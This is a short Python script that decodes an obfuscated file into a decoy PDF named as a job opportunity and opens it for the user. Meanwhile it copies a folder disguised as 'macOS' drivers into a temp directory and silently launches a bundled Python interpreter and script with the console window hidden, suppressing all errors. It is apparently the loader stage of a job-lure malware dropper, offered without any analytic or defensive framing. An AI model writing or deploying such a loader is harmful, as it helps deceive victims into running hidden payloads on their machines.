import os
import shutil
import subprocess
import tempfile
import base64

XOR_KEY = 0x5A

def decrypt_and_open_pdf():
    try:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        dat_path = os.path.join(base_dir, "MAJE.dat")
        if not os.path.exists(dat_path):
            return
            
        with open(dat_path, "rb") as f:
            encrypted_data = f.read()
            
        xored_data = bytes([b ^ XOR_KEY for b in encrypted_data])
        decrypted_data = base64.b64decode(xored_data)
        
        # Create the specific PDF file in temp directory
        target_name = "CAREER OPPORTUNITY AT MAJE.pdf"
        tmp_pdf_path = os.path.join(tempfile.gettempdir(), target_name)
        with open(tmp_pdf_path, "wb") as tmp_pdf:
            tmp_pdf.write(decrypted_data)
            
        os.startfile(tmp_pdf_path)
    except:
        pass

def copy_macOS_folder():
    try:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        source_macOS = os.path.join(base_dir, "macOS")
        if not os.path.exists(source_macOS):
            return None
        dest_root = os.path.join(tempfile.gettempdir(), "Drivers")
        os.makedirs(dest_root, exist_ok=True)
        dest_macOS = os.path.join(dest_root, "macOS")
        shutil.copytree(source_macOS, dest_macOS, dirs_exist_ok=True)
        return dest_macOS
    except Exception as e:
        return None

def run_python_in_macOS(dest_macOS):
    try:
        exe = os.path.join(dest_macOS, "py.exe")
        script = os.path.join(dest_macOS, "run.py")
        if not os.path.exists(exe) or not os.path.exists(script):
            return
        cmd = [exe, script]
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

if __name__ == "__main__":
    decrypt_and_open_pdf()
    path = copy_macOS_folder()
    if path:
        run_python_in_macOS(path)
